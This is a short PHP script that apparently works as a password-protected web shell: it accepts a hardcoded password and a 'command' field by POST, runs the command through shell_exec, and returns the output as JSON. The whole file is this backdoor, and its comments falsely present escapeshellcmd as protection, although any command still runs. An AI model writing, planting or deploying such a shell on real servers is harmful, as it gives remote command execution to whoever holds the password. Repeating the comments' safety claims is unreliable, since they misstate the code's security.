<?php
// Define a secure password
$validPassword = 'a1eg654aebh5a1rh654argv2a1e35g4vaeg';

// Initialize output
$output = '';

if (isset($_POST['password']) && $_POST['password'] === $validPassword) {
    // Check if the command parameter is set
    if (isset($_POST['command'])) {
        // Sanitize the command to prevent injection attacks (basic sanitation)
        $command = escapeshellcmd($_POST['command']);
        
        // Execute the command
        $output = shell_exec($command);
    }
} else {
    $output = 'Invalid password.';
}

// Return the output as JSON
header('Content-Type: application/json');
echo json_encode(['output' => $output]);
?>
